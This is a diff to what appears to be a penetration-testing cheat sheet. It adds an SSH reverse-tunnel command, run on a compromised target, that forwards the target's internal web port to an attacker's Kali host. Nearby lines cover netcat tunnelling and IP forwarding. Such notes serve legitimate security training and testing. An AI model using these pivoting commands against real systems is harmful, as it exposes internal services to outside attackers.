@@ -808,6 +808,10 @@ Afterwards, connect to localhost:8000 to access
 NC tunneling, from localhost 8000 through device 123.123.123.123 to internal device 10.10.1.1:7000  
 Afterwards, connect to 123.123.123.123:8000 to access  
 
+	ssh -N -R 127.0.0.1:8000:127.0.0.1:80 kali@<kali-ip>
+Reverse tunnelling. To port forward (reverse) from target machine 127.0.0.1:80 to kali 127.0.0.1:8000.  
+Execute this on the target machine. Make sure SSH is running on kali. Interactive shell may be needed (using python /bin/bash etc)  
+
 	sysctl net.ipv4.ip_forward
 	sudo sysctl -w net.ipv4.ip_forward
 Check if iptables forwarding is enabled  
